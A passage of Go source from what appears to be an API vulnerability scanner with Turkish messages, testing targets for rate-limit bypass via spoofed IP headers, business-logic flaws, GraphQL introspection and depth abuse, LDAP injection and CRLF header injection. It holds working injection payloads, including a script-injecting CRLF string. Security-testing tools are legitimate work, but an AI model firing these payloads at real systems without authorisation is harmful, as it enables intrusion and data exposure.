				URL:         testURL,
				Method:      "GET",
				Description: fmt.Sprintf("Eski/farklı API versiyonu '%s' erişilebilir durumda. Deprecated endpoint'ler güvenlik yamaları uygulanmamış olabilir.", v),
				Evidence:    fmt.Sprintf("GET %s → HTTP 200 (%d byte)", testURL, result.ResponseSize),
			})
		}
	}
	return findings
}

func (r *Runner) testRateLimitBypass(method, url string, headers map[string]string) []Finding {
	var findings []Finding

	successCount := 0
	for i := 0; i < 10; i++ {
		result := r.client.Do(method, url, headers, nil)
		if result.Error == "" && result.StatusCode == 200 {
			successCount++
		} else if result.StatusCode == 429 {
			return findings // rate limit var, iyi
		}
	}

	if successCount == 10 {
		findings = append(findings, Finding{
			TestName:    "Missing Rate Limiting",
			Severity:    Medium,
			URL:         url,
			Method:      method,
			Description: "10 ardışık istek hiç engellenmedi. Rate limiting / brute force koruması eksik görünüyor.",
			Evidence:    "10/10 istek HTTP 200 ile yanıt verdi, hiç HTTP 429 (Too Many Requests) dönmedi",
		})
	}

	// X-Forwarded-For ile IP rotasyonu bypass
	bypassHeaders := copyHeaders(headers)
	bypassHeaders["X-Forwarded-For"] = "1.2.3.4"
	bypassHeaders["X-Real-IP"] = "1.2.3.4"

	result := r.client.Do(method, url, bypassHeaders, nil)
	if result.Error == "" && result.StatusCode == 200 {
		findings = append(findings, Finding{
			TestName:    "Rate Limit Bypass (IP Spoofing)",
			Severity:    High,
			URL:         url,
			Method:      method,
			Description: "X-Forwarded-For / X-Real-IP header'ları ile IP tabanlı rate limit atlatılabilir.",
			Evidence:    fmt.Sprintf("X-Forwarded-For: 1.2.3.4 ile istek → HTTP %d", result.StatusCode),
		})
	}
	return findings
}

func (r *Runner) testBusinessLogicFlaws(method, url string, headers map[string]string) []Finding {
	var findings []Finding

	if method != "POST" && method != "PUT" && method != "PATCH" {
		return findings
	}

	testHeaders := copyHeaders(headers)
	testHeaders["Content-Type"] = "application/json"

	// Negatif miktar/fiyat
	negativePayloads := []struct {
		body string
		desc string
	}{
		{`{"amount": -100, "quantity": -1}`, "Negatif amount/quantity"},
		{`{"price": 0}`, "Sıfır fiyat"},
		{`{"quantity": 99999999}`, "Aşırı büyük miktar"},
		{`{"discount": 101}`, "%100 üzeri indirim"},
	}

	for _, p := range negativePayloads {
		result := r.client.Do(method, url, testHeaders, strings.NewReader(p.body))
		if result.Error != "" {
			continue
		}

		if result.StatusCode == 200 || result.StatusCode == 201 {
			findings = append(findings, Finding{
				TestName:    "Business Logic Flaw",
				Severity:    High,
				URL:         url,
				Method:      method,
				Description: fmt.Sprintf("Geçersiz iş mantığı değeri kabul edildi: %s", p.desc),
				Evidence:    fmt.Sprintf("Input body: %s → HTTP %d (sunucu reddetmedi)", p.body, result.StatusCode),
			})
		}
	}
	return findings
}

func copyHeaders(h map[string]string) map[string]string {
	out := make(map[string]string)
	for k, v := range h {
		out[k] = v
	}
	return out
}

// https://api.example.com/users/1 → https://api.example.com
func extractBase(url string) string {
	// proto://host bul
	if idx := strings.Index(url, "://"); idx != -1 {
		rest := url[idx+3:]
		if slashIdx := strings.Index(rest, "/"); slashIdx != -1 {
			return url[:idx+3+slashIdx]
		}
		return url
	}
	return url
}

// /users/1 → /users/2
func replaceLastID(url, newID string) string {
	parts := strings.Split(url, "/")
	for i := len(parts) - 1; i >= 0; i-- {
		if isNumeric(parts[i]) {
			parts[i] = newID
			return strings.Join(parts, "/")
		}
	}
	return url
}

func isNumeric(s string) bool {
	if s == "" {
		return false
	}
	for _, c := range s {
		if c < '0' || c > '9' {
			return false
		}
	}
	return true
}

func (r *Runner) testGraphQL(url string, headers map[string]string) []Finding {
	var findings []Finding

	base := extractBase(url)
	graphqlEndpoints := []string{"/graphql", "/api/graphql", "/graphiql", "/query", "/gql"}

	introspectionQuery := `{"query":"{ __schema { types { name fields { name } } } }"}`
	sensitiveQuery := `{"query":"{ user { password apiKey secret token internalNotes } }"}`
	depthQuery := `{"query":"{ user { friends { friends { friends { friends { id } } } } } }"}`

	testHeaders := copyHeaders(headers)
	testHeaders["Content-Type"] = "application/json"

	for _, ep := range graphqlEndpoints {
		testURL := base + ep

		// 1. Introspection
		result := r.client.Do("POST", testURL, testHeaders, strings.NewReader(introspectionQuery))
		if result.Error != "" || result.StatusCode == 404 {
			continue
		}

		if result.StatusCode == 200 && strings.Contains(result.Body, `"__schema"`) {
			findings = append(findings, Finding{
				TestName:    "GraphQL Introspection Enabled",
				Severity:    High,
				URL:         testURL,
				Method:      "POST",
				Description: "GraphQL introspection aktif — API şemasının tamamı dışarıya açık. Saldırgan tüm query/mutation'ları keşfedebilir.",
				Evidence:    fmt.Sprintf("Introspection query → HTTP %d, __schema alanı response'da bulundu", result.StatusCode),
			})
		}

		// 2. Hassas alan sorgulama
		result2 := r.client.Do("POST", testURL, testHeaders, strings.NewReader(sensitiveQuery))
		if result2.Error == "" && result2.StatusCode == 200 {
			sensitiveFields := []string{`"password"`, `"apiKey"`, `"secret"`, `"token"`}
			for _, f := range sensitiveFields {
				if strings.Contains(result2.Body, f) {
					findings = append(findings, Finding{
						TestName:    "GraphQL Sensitive Field Exposure",
						Severity:    Critical,
						URL:         testURL,
						Method:      "POST",
						Description: fmt.Sprintf("GraphQL response'da hassas '%s' alanı döndü — yetkilendirme eksik.", f),
						Evidence:    fmt.Sprintf("Query: %s → Response içinde %s bulundu", sensitiveQuery, f),
					})
					break
				}
			}
		}

		// 3. Derinlik limiti yok mu? (DoS riski)
		result3 := r.client.Do("POST", testURL, testHeaders, strings.NewReader(depthQuery))
		if result3.Error == "" && result3.StatusCode == 200 {
			findings = append(findings, Finding{
				TestName:    "GraphQL Depth Limit Missing",
				Severity:    Medium,
				URL:         testURL,
				Method:      "POST",
				Description: "GraphQL sorgu derinlik limiti yok — iç içe sorgularla DoS saldırısı yapılabilir (Batching / N+1).",
				Evidence:    fmt.Sprintf("4 seviye iç içe query → HTTP %d (reddedilmedi)", result3.StatusCode),
			})
		}

		break // bir endpoint bulunca yeterli
	}
	return findings
}

func (r *Runner) testLDAPInjection(method, url string) []Finding {
	var findings []Finding

	ldapPayloads := []struct {
		payload string
		desc    string
	}{
		{"*", "LDAP wildcard — tüm kayıtları döndürür"},
		{"*)(uid=*", "LDAP filter injection"},
		{"*)(|(uid=*", "LDAP OR injection"},
		{"admin)(&(password=*", "LDAP attribute injection"},
		{"*))%00", "LDAP null byte injection"},
	}

	ldapParams := []string{"username", "user", "login", "email", "search", "query", "filter", "cn"}

	for _, param := range ldapParams {
		for _, p := range ldapPayloads[:2] { // ilk 2 payload yeterli
			testURL := fmt.Sprintf("%s?%s=%s", url, param, p.payload)
			result := r.client.Do("GET", testURL, nil, nil)
			if result.Error != "" {
				continue
			}

			ldapErrors := []string{"ldap", "ldap_search", "invalid filter", "filter error", "naming violation"}
			lowerBody := strings.ToLower(result.Body)
			for _, e := range ldapErrors {
				if strings.Contains(lowerBody, e) {
					findings = append(findings, Finding{
						TestName:    "LDAP Injection",
						Severity:    Critical,
						URL:         testURL,
						Method:      "GET",
						Description: "Response'da LDAP hata mesajı tespit edildi — LDAP injection açığı mevcut.",
						Evidence:    fmt.Sprintf("?%s=%s → Response içinde LDAP hatası '%s' bulundu", param, p.payload, e),
					})
					return findings
				}
			}

			if p.payload == "*" && result.StatusCode == 200 && result.ResponseSize > 500 {
				findings = append(findings, Finding{
					TestName:    "LDAP Injection (Wildcard Response)",
					Severity:    High,
					URL:         testURL,
					Method:      "GET",
					Description: fmt.Sprintf("'%s' parametresine wildcard (*) gönderildiğinde büyük response döndü — LDAP injection olabilir.", param),
					Evidence:    fmt.Sprintf("?%s=* → HTTP %d, %d byte (normalden fazla)", param, result.StatusCode, result.ResponseSize),
				})
			}
		}
	}
	return findings
}

func (r *Runner) testCRLFInjection(method, url string, headers map[string]string) []Finding {
	var findings []Finding

	crlfPayloads := []struct {
		param   string
		payload string
	}{
		{"url", "%0d%0aSet-Cookie:%20injected=true"},
		{"redirect", "%0d%0aX-Injected:%20true"},
		{"next", "\r\nX-Injected: true"},
		{"lang", "%0aX-Injected:%20true"},
		{"callback", "%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"},
	}

	for _, p := range crlfPayloads {
		testURL := fmt.Sprintf("%s?%s=%s", url, p.param, p.payload)
		result := r.client.Do(method, testURL, headers, nil)
		if result.Error != "" {
			continue
		}

		if _, injected := result.Headers["X-Injected"]; injected {
			findings = append(findings, Finding{
				TestName:    "CRLF Injection / Response Splitting",
				Severity:    High,
				URL:         testURL,
				Method:      method,
				Description: fmt.Sprintf("'%s' parametresine CRLF karakteri eklenerek HTTP response'a sahte header enjekte edildi.", p.param),
				Evidence:    fmt.Sprintf("?%s=<CRLF payload> → Response içinde 'X-Injected' header'ı bulundu", p.param),
			})
			return findings
		}

		if _, injected := result.Headers["Set-Cookie"]; injected {
			cookies := result.Headers["Set-Cookie"]
			for _, c := range cookies {
				if strings.Contains(c, "injected=true") {
					findings = append(findings, Finding{
						TestName:    "CRLF Injection (Cookie Injection)",
						Severity:    High,
						URL:         testURL,
						Method:      method,
						Description: fmt.Sprintf("CRLF injection ile sahte Set-Cookie header'ı enjekte edildi. Session fixation / XSS saldırısı mümkün."),
						Evidence:    fmt.Sprintf("?%s=<CRLF> → Set-Cookie: injected=true response'da döndü", p.param),
					})
					return findings
				}
			}
		}
	}
	return findings
}

func (r *Runner) testRateLimitHeaders(method, url string, headers map[string]string) []Finding {
	var findings []Finding

	result := r.client.Do(method, url, headers, nil)
	if result.Error != "" || result.StatusCode == 404 {
		return findings
	}

	rateLimitHeaders := []string{
		"X-RateLimit-Limit",
		"X-RateLimit-Remaining",
		"X-RateLimit-Reset",
		"Retry-After",
		"RateLimit-Limit",
	}

	hasAny := false
	for _, h := range rateLimitHeaders {
		if _, ok := result.Headers[h]; ok {
			hasAny = true
			break
		}
	}

	if !hasAny && (result.StatusCode == 200 || result.StatusCode == 201) {
		findings = append(findings, Finding{
			TestName:    "Rate Limit Headers Missing",
			Severity:    Low,
			URL:         url,
			Method:      method,
			Description: "Response'da rate limit header'ları (X-RateLimit-*, Retry-After) bulunamadı. İstemci rate limit durumunu bilemez.",
			Evidence:    "X-RateLimit-Limit, X-RateLimit-Remaining, Retry-After header'larının hiçbiri response'da yok",
		})
	}
	return findings
}

